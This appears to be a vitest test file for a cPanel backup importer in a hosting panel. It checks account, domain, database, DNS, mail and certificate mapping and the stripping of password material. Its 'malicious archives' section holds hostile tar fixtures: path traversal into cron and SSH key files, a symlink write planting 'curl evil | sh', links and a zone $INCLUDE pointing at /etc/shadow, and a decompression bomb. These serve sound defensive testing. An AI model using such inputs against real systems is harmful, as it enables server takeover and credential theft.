import { describe, expect, it } from 'vitest'
import { XpanelError } from '@xpanel/core'
import type { Body } from '../archive/reader.ts'
import type { ImportSink, SinkItem } from '../archive/sink.ts'
import { parseMailConfig } from '../backup/mail-config.ts'
import { cpmoveEntries } from '../testing/cpanel-fixture.ts'
import { buildTar, chunked } from '../testing/tar.ts'
import type { TestEntry } from '../testing/tar.ts'
import { services } from '@xpanel/render'
import { readCpanelArchive } from './import.ts'

class MemorySink implements ImportSink {
  items: { item: SinkItem; data: string }[] = []
  aborted: Error | null = null
  async put(item: SinkItem, body: Body): Promise<string> {
    const parts: Buffer[] = []
    for await (const c of body) parts.push(c)
    this.items.push({ item, data: Buffer.concat(parts).toString() })
    return `ref-${this.items.length}`
  }
  async abort(e: Error): Promise<void> { this.aborted = e }
  paths(part: SinkItem['part']): string[] { return this.items.filter((i) => i.item.part === part).map((i) => i.item.path) }
}

const NOW = new Date('2027-01-01T00:00:00Z')

const run = async (entries: TestEntry[] = cpmoveEntries(), opts: { gzip?: boolean; targetUsername?: string; ipv4?: string; chunk?: number } = {}) => {
  const sink = new MemorySink()
  const buf = await buildTar(entries, { gzip: opts.gzip ?? true })
  const plan = await readCpanelArchive(chunked(buf, opts.chunk ?? 512), {
    sink, now: NOW, ...(opts.targetUsername ? { targetUsername: opts.targetUsername } : {}), ...(opts.ipv4 ? { ipv4: opts.ipv4 } : {}),
  })
  return { plan, sink }
}

const ALL = [...services.MARIADB_PRIVILEGES]

const codes = (p: { warnings: { code: string }[] }): string[] => p.warnings.map((w) => w.code)

describe('readCpanelArchive: plan', async () => {
  const { plan, sink } = await run()

  it('reads the account from cp/<user>, quota and userdata/main', () => {
    expect(plan.format).toBe('cpmove')
    expect(plan.sourceUsername).toBe('bob')
    expect(plan.account).toEqual({
      username: 'bob',
      primaryDomain: 'bob.example',
      contactEmail: 'bob@gmail.com',
      sourcePlan: 'gold',
      sourceIp: '203.0.113.10',
      diskQuotaMb: 5000,
      bandwidthMbMonth: 10240,
      caps: { addonDomains: 5, aliasDomains: 'unlimited', subdomains: 10, mailboxes: 'unlimited', databases: 3 },
      passwordResetRequired: true,
    })
  })

  it('maps domains to kinds with document roots rebased into the new home', () => {
    expect(plan.domains.map((d) => [d.name, d.kind, d.parent, d.docRoot, d.phpVersion, d.wildcard])).toEqual([
      ['bob.example', 'primary', null, 'public_html', '8.1', true],
      ['shop.example', 'addon', null, 'shop.example', '7.4', false],
      ['bob.net', 'alias', 'bob.example', 'public_html', '8.1', false],
      ['blog.bob.example', 'subdomain', 'bob.example', 'public_html/blog', null, false],
      ['cdn.bob.example', 'subdomain', 'bob.example', 'cdn.bob.example', null, false],
    ])
    expect(plan.domains[0]?.serverAliases).toEqual(['www.bob.example', 'mail.bob.example'])
    expect(codes(plan)).toContain('docroot-outside-home')
    expect(plan.domains.some((d) => d.name === 'shop.bob.example' || d.name === 'evil.example')).toBe(false)
  })

  it('imports databases by reference with prefixes mapped', () => {
    expect(plan.databases.map((d) => [d.sourceName, d.name, d.sql.archivePath, d.sql.ref])).toEqual([
      ['bob_wp', 'bob_wp', 'cpmove-bob/mysql/bob_wp.sql', 'ref-1'],
      ['legacy', 'bob_legacy', 'cpmove-bob/mysql/legacy.sql', 'ref-2'],
    ])
    expect(plan.databases[0]?.sql.size).toBe(65)
    expect(plan.databases[0]?.sql.sha256).toMatch(/^[0-9a-f]{64}$/)
    expect(codes(plan)).toEqual(expect.arrayContaining(['database-renamed', 'database-skipped']))
  })

  it('parses grants, drops dangerous privileges and never keeps password hashes', () => {
    expect(plan.dbUsers).toEqual([
      { sourceName: 'bob_wpuser', name: 'bob_wpuser', hosts: ['localhost', '203.0.113.99'], grants: [{ database: 'bob_wp', privileges: ALL }], passwordResetRequired: true },
      { sourceName: 'bob_mixed', name: 'bob_mixed', hosts: ['localhost'], grants: [{ database: 'bob_wp', privileges: ['SELECT'] }], passwordResetRequired: true },
      { sourceName: 'legacyuser', name: 'bob_legacyuser', hosts: ['localhost'], grants: [{ database: 'bob_legacy', privileges: ALL }], passwordResetRequired: true },
    ])
    expect(plan.remoteDbHosts).toEqual(['203.0.113.99'])
    const msgs = plan.warnings.map((w) => w.message).join('\n')
    expect(msgs).toMatch(/global privileges FILE for bob_evil/)
    expect(msgs).toMatch(/SUPER for bob_mixed is not allowed/)
    expect(msgs).toMatch(/GRANT OPTION for bob_mixed/)
    expect(msgs).toMatch(/table-level grant bob_wp.secrets/)
    expect(msgs).toMatch(/missing database other_db/)
  })

  it('imports the zone of account domains only, through the shared BIND parser, without the old SOA', () => {
    expect(plan.dnsZones.map((z) => z.zone)).toEqual(['bob.example'])
    const z = plan.dnsZones[0]
    expect(z?.sourceNameservers).toEqual(['ns1.oldhost.example', 'ns2.oldhost.example'])
    expect(z?.records.map((r) => `${r.name} ${r.type} ${r.priority ?? '-'} ${r.content}`)).toEqual([
      '@ NS - ns1.oldhost.example.', '@ NS - ns2.oldhost.example.', '@ A - 203.0.113.10', 'www CNAME - bob.example.', '@ MX 0 bob.example.', '@ TXT - v=spf1 +a +mx ~all',
    ])
    expect(z?.records.every((r) => r.zone === 'bob.example')).toBe(true)
    expect(codes(plan)).toEqual(expect.arrayContaining(['zone-skipped', 'dns-record-skipped']))
    expect(plan.warnings.find((w) => w.code === 'dns-record-skipped')?.message).toMatch(/PTR/)
  })

  it('imports mailboxes with quotas and reset-required passwords', () => {
    expect(plan.mailboxes).toEqual([
      { address: 'info@bob.example', quotaMb: 50, maildir: 'mail/bob.example/info', hasMaildir: true, passwordResetRequired: true },
      { address: 'support@bob.example', quotaMb: 'unlimited', maildir: 'mail/bob.example/support', hasMaildir: false, passwordResetRequired: true },
    ])
    expect(codes(plan)).toEqual(expect.arrayContaining(['mailbox-skipped', 'maildir-orphan']))
    expect(plan.warnings.filter((w) => w.code === 'mailbox-skipped').map((w) => w.message)).toEqual([
      'mailbox Bad..Name@bob.example has a name xPanel does not allow',
      'mail domain victim.example is not a domain of this account',
    ])
  })

  it('imports address forwarders and default addresses in the renderer shapes, never pipes or files', () => {
    expect(plan.mail).toEqual([
      { domain: 'bob.example', forwarders: [{ local: 'info', to: ['bob@gmail.com', 'team@bob.example'] }], defaultAddress: { kind: 'reject' } },
      { domain: 'shop.example', forwarders: [], defaultAddress: { kind: 'forward', to: ['owner@shop.example'] } },
    ])
    expect(() => parseMailConfig({ domains: plan.mail, mailboxes: [] }, plan.domains.map((d) => d.name))).not.toThrow()
    expect(plan.warnings.filter((w) => w.code === 'forwarder-skipped').map((w) => w.message)).toEqual(['boss@bob.example -> local-user is not imported'])
    const unsafe = plan.warnings.filter((w) => w.code === 'forwarder-unsafe').map((w) => w.message)
    expect(unsafe).toEqual(['sales@bob.example delivers to a pipe; not imported and never executed', 'orders@shop.example delivers to a file; not imported and never executed'])
    expect(codes(plan)).toContain('filters-not-imported')
  })

  it('matches certificates to keys and drops foreign ones', () => {
    expect(plan.certificates).toHaveLength(1)
    expect(plan.certificates[0]).toMatchObject({ names: ['bob.example', 'www.bob.example'], notAfter: '2036-10-18T23:29:10.000Z' })
    expect(plan.certificates[0]?.key?.ref).toMatch(/^ref-/)
    expect(codes(plan)).toContain('ssl-cert-foreign')
  })

  it('copies home content but not credentials, cPanel internals or escaping links', () => {
    expect(sink.paths('home')).toEqual([
      'public_html', 'public_html/index.php', 'public_html/blog/index.html', 'www', 'mail/bob.example/info/cur/1700000000.M1.host:2,S', 'mail/bob.example/ghost/new/1', 'hard',
    ])
    const hard = sink.items.find((i) => i.item.path === 'hard')
    expect(hard?.item).toMatchObject({ type: 'hardlink', linkTarget: 'public_html/index.php' })
    expect(plan.home).toEqual({ files: 5, directories: 1, symlinks: 1, bytes: 63, skipped: 3 })
    expect(codes(plan)).toEqual(expect.arrayContaining(['symlink-escape', 'special-file', 'credentials-file-skipped', 'cpanel-internal']))
  })

  it('keeps no password material anywhere in the plan or the sink', () => {
    const everything = JSON.stringify(plan) + JSON.stringify(sink.items)
    for (const secret of ['ACCOUNTHASH', 'MAILBOXSECRET', 'MYSQLSECRET', '*BBBBBBBB', '*AAAAAAAA', 'DKIM PRIVATE']) expect(everything).not.toContain(secret)
    expect(sink.items.filter((i) => i.item.part === 'ssl-key')).toHaveLength(1)
  })

  it('reports unsupported items once', () => {
    expect(codes(plan)).toEqual(expect.arrayContaining(['password-not-kept', 'cron-not-imported', 'postgresql-unsupported', 'dkim-keys-not-imported', 'unsupported-item']))
    expect(plan.warnings.filter((w) => w.code === 'unsupported-item').map((w) => w.message)).toEqual(['frobnicator is not imported'])
  })
})

describe('readCpanelArchive: variants', () => {
  it('moves A records that pointed at the source server to this one', async () => {
    const { plan } = await run(cpmoveEntries(), { ipv4: '198.51.100.7' })
    expect(plan.dnsZones[0]?.records.filter((r) => r.type === 'A').map((r) => r.content)).toEqual(['198.51.100.7'])
    expect(codes(plan)).toContain('a-records-moved')
    await expect(run(cpmoveEntries(), { ipv4: '999.1.1.1' })).rejects.toThrow(XpanelError)
  })

  it('a dry run without a sink plans the same entities', async () => {
    const buf = await buildTar(cpmoveEntries(), { gzip: true })
    const dry = await readCpanelArchive(chunked(buf), { now: NOW })
    expect(dry.databases.map((d) => [d.name, d.sql.ref])).toEqual([['bob_wp', null], ['bob_legacy', null]])
    expect(dry.domains).toHaveLength(5)
  })

  it('renames the account and every prefixed name', async () => {
    const { plan } = await run(cpmoveEntries(), { targetUsername: 'robert' })
    expect(plan.account.username).toBe('robert')
    expect(plan.databases.map((d) => d.name)).toEqual(['robert_wp', 'robert_legacy'])
    expect(plan.dbUsers.map((u) => u.name)).toEqual(['robert_wpuser', 'robert_mixed', 'robert_legacyuser'])
    expect(plan.dbUsers[0]?.grants[0]?.database).toBe('robert_wp')
  })

  it('accepts the backup-<date>_<user> layout and plain tar', async () => {
    const top = 'backup-10.22.2026_01-35-00_bob'
    const entries = cpmoveEntries(top).map((e) => (e.linkname?.startsWith('cpmove-bob/') ? { ...e, linkname: e.linkname.replace('cpmove-bob', top) } : e))
    const { plan } = await run(entries, { gzip: false })
    expect(plan.format).toBe('backup')
    expect(plan.topDir).toBe(top)
    expect(plan.domains[0]?.name).toBe('bob.example')
  })

  it('refuses a reserved source name without a rename before any content is stored', async () => {
    const top = 'cpmove-admin'
    const entries: TestEntry[] = [{ name: `${top}/`, type: 'directory' }, { name: `${top}/homedir/`, type: 'directory' }, { name: `${top}/homedir/index.php`, content: 'x' }]
    const sink = new MemorySink()
    const buf = await buildTar(entries, { gzip: true })
    await expect(readCpanelArchive(chunked(buf), { sink })).rejects.toThrow(/reserved/)
    expect(sink.items).toEqual([])
    const renamed = await readCpanelArchive(chunked(await buildTar([...entries, { name: `${top}/cp/admin`, content: 'DNS=admin.example\n' }], { gzip: true })), { targetUsername: 'adminsite' })
    expect(renamed.account.username).toBe('adminsite')
  })

  it('rejects invalid target names and archives without a main domain', async () => {
    await expect(run(cpmoveEntries(), { targetUsername: 'root' })).rejects.toThrow(XpanelError)
    await expect(run(cpmoveEntries(), { targetUsername: '../x' })).rejects.toThrow(XpanelError)
    const noMain = cpmoveEntries().filter((e) => !e.name.includes('userdata/main') && !e.name.endsWith('cp/bob'))
    await expect(run(noMain)).rejects.toThrow(/no valid main domain/)
  })

  it('imports deploy-style symlink chains, skipping only the link that resolves through another', async () => {
    const top = 'cpmove-bob'
    const { plan, sink } = await run([...cpmoveEntries(),
      { name: `${top}/homedir/public_html/live`, type: 'symlink', linkname: 'current' },
      { name: `${top}/homedir/public_html/current`, type: 'symlink', linkname: 'blog' },
    ])
    expect(sink.paths('home')).toContain('public_html/live')
    expect(sink.paths('home')).not.toContain('public_html/current')
    expect(plan.warnings.find((w) => w.path === `${top}/homedir/public_html/current`)?.code).toBe('symlink-chain')
  })

  it('treats only mail/<domain>/<local> as mailbox stores and reports the default inbox once', async () => {
    const top = 'cpmove-bob'
    const { plan, sink } = await run([...cpmoveEntries(),
      { name: `${top}/homedir/mail/cur/1700000001.M1.host:2,S`, content: 'a' },
      { name: `${top}/homedir/mail/cur/1700000002.M2.host:2,S`, content: 'b' },
      { name: `${top}/homedir/mail/new/1700000003.M3.host`, content: 'c' },
      { name: `${top}/homedir/mail/.Sent/cur/1700000004.M4.host:2,S`, content: 'd' },
    ])
    expect(plan.warnings.filter((w) => w.code === 'maildir-orphan').map((w) => w.message)).toEqual(['maildir for ghost@bob.example has no mail account; its files were copied'])
    expect(plan.warnings.filter((w) => w.code === 'main-inbox-not-imported')).toHaveLength(1)
    expect(sink.paths('home')).toContain('mail/cur/1700000001.M1.host:2,S')
  })

  it('never recreates excluded or skipped content through a hardlink', async () => {
    const top = 'cpmove-bob'
    const { plan, sink } = await run([...cpmoveEntries(),
      { name: `${top}/homedir/public_html/creds.txt`, type: 'link', linkname: `${top}/homedir/.my.cnf` },
      { name: `${top}/homedir/public_html/hash.txt`, type: 'link', linkname: `${top}/homedir/etc/bob.example/shadow` },
      { name: `${top}/homedir/public_html/cache`, type: 'link', linkname: `${top}/homedir/.cpanel/datastore/x` },
      { name: `${top}/homedir/public_html/pipe`, type: 'link', linkname: `${top}/homedir/dev` },
      { name: `${top}/homedir/public_html/again`, type: 'link', linkname: `${top}/homedir/public_html/creds.txt` },
    ])
    for (const p of ['creds.txt', 'hash.txt', 'cache', 'pipe', 'again']) expect(sink.paths('home')).not.toContain(`public_html/${p}`)
    expect(plan.warnings.filter((w) => w.code === 'hardlink-skipped')).toHaveLength(5)
    expect(plan.home.skipped).toBe(8)
    expect(sink.items.find((i) => i.item.path === 'hard')?.item.linkTarget).toBe('public_html/index.php')
  })

  it('stores only the certificates it imports and their keys', async () => {
    const top = 'cpmove-bob'
    const other = (await import('node:crypto')).generateKeyPairSync('ec', { namedCurve: 'P-256' }).privateKey.export({ type: 'pkcs8', format: 'pem' }) as string
    const { plan, sink } = await run([...cpmoveEntries(), { name: `${top}/sslkeys/victim_example.key`, content: other }])
    expect(sink.items.filter((i) => i.item.part === 'ssl-key').map((i) => i.item.path)).toEqual(['bob_example.key'])
    expect(sink.items.filter((i) => i.item.part === 'ssl-cert').map((i) => i.item.path)).toEqual(['bob_example.crt'])
    expect(plan.warnings.find((w) => w.code === 'ssl-key-unused')?.message).toMatch(/victim_example.key/)
    expect(plan.certificates[0]?.cert.ref).toMatch(/^ref-/)
  })

  it('degrades gracefully on unreadable userdata', async () => {
    const entries = cpmoveEntries().map((e) => (e.name.endsWith('userdata/bob.example') ? { ...e, content: 'a: &x [*x, *x]\nb: [*x,*x,*x,*x,*x,*x,*x,*x,*x,*x,*x,*x,*x,*x,*x,*x,*x,*x,*x,*x,*x,*x]\n: :' } : e))
    const { plan } = await run(entries)
    expect(codes(plan)).toContain('userdata-unreadable')
    expect(plan.domains[0]?.docRoot).toBe('public_html')
  })
})

describe('readCpanelArchive: malicious archives', () => {
  const base = (): TestEntry[] => [
    { name: 'cpmove-bob/', type: 'directory' },
    { name: 'cpmove-bob/cp/bob', content: 'DNS=bob.example\n' },
    { name: 'cpmove-bob/homedir/', type: 'directory' },
  ]

  const rejected = async (extra: TestEntry[], re: RegExp, entries = [...base(), ...extra]) => {
    const sink = new MemorySink()
    const buf = await buildTar(entries, { gzip: true })
    const p = readCpanelArchive(chunked(buf), { sink })
    await expect(p).rejects.toThrow(XpanelError)
    await expect(readCpanelArchive(chunked(buf))).rejects.toThrow(re)
    expect(sink.aborted).not.toBeNull()
    return sink
  }

  it('rejects path traversal and absolute names', async () => {
    await rejected([{ name: 'cpmove-bob/homedir/../../../etc/cron.d/evil', content: '* * * * * root id' }], /path traversal/)
    await rejected([{ name: '/etc/cron.d/evil', content: 'x' }], /absolute/)
    await rejected([{ name: 'cpmove-bob/homedir/public_html/../../../../root/.ssh/authorized_keys', content: 'ssh-ed25519 AAAA' }], /path traversal/)
  })

  it('rejects entries outside the account directory and foreign top directories', async () => {
    await rejected([{ name: 'cpmove-eve/homedir/x', content: 'x' }], /outside cpmove-bob/)
    await rejected([], /not a cPanel account backup/, [{ name: 'evil/', type: 'directory' }, { name: 'evil/x', content: 'x' }])
    await rejected([], /not a cPanel account backup/, [{ name: 'cpmove-Root/', type: 'directory' }])
  })

  it('rejects writes through a symlink and hardlinks out of homedir', async () => {
    const sink = await rejected([
      { name: 'cpmove-bob/homedir/public_html/', type: 'directory' },
      { name: 'cpmove-bob/homedir/public_html/up', type: 'symlink', linkname: '..' },
      { name: 'cpmove-bob/homedir/public_html/up/.bashrc', content: 'curl evil | sh' },
    ], /through or over a symlink/)
    expect(sink.items.map((i) => i.item.path)).not.toContain('public_html/up/.bashrc')
    await rejected([{ name: 'cpmove-bob/homedir/stolen', type: 'link', linkname: 'cpmove-bob/shadow' }], /hardlink target outside/)
    await rejected([{ name: 'cpmove-bob/homedir/stolen', type: 'link', linkname: '/etc/shadow' }], /hardlink/)
  })

  it('skips symlinks pointing outside the home instead of extracting them', async () => {
    const sink = new MemorySink()
    const buf = await buildTar([...base(),
      { name: 'cpmove-bob/homedir/root', type: 'symlink', linkname: '/' },
      { name: 'cpmove-bob/homedir/sneaky', type: 'symlink', linkname: 'public_html/../../../../etc' },
      { name: 'cpmove-bob/mysql/x.sql', type: 'symlink', linkname: '/etc/shadow' },
      { name: 'cpmove-bob/homedir/ok', content: 'fine' },
    ], { gzip: true })
    const plan = await readCpanelArchive(chunked(buf), { sink })
    expect(sink.paths('home')).toEqual(['ok'])
    expect(plan.databases).toEqual([])
    expect(plan.warnings.filter((w) => w.code.startsWith('symlink')).map((w) => w.path)).toEqual(['cpmove-bob/homedir/root', 'cpmove-bob/homedir/sneaky', 'cpmove-bob/mysql/x.sql'])
  })

  it('enforces size caps (decompression bombs)', async () => {
    const buf = await buildTar([...base(), { name: 'cpmove-bob/homedir/big', content: Buffer.alloc(200_000) }], { gzip: true })
    expect(buf.length).toBeLessThan(5_000)
    await expect(readCpanelArchive(chunked(buf), { limits: { maxTotalBytes: 100_000 } })).rejects.toThrow(/exceeds/)
  })

  it('caps metadata files read into memory', async () => {
    const { plan } = await run([...base(), { name: 'cpmove-bob/dnszones/bob.example.db', content: Buffer.alloc(4 * 1024 * 1024 + 1, 0x78) }], { chunk: 64 * 1024 })
    expect(codes(plan)).toContain('file-too-large')
    expect(plan.dnsZones).toEqual([])
  })

  it('never follows include directives in zone files', async () => {
    const { plan } = await run([...base(), { name: 'cpmove-bob/dnszones/bob.example.db', content: '$INCLUDE /etc/shadow\n@ IN A 192.0.2.1\n' }])
    expect(plan.dnsZones).toEqual([])
    expect(codes(plan)).toContain('zone-unreadable')
  })
})
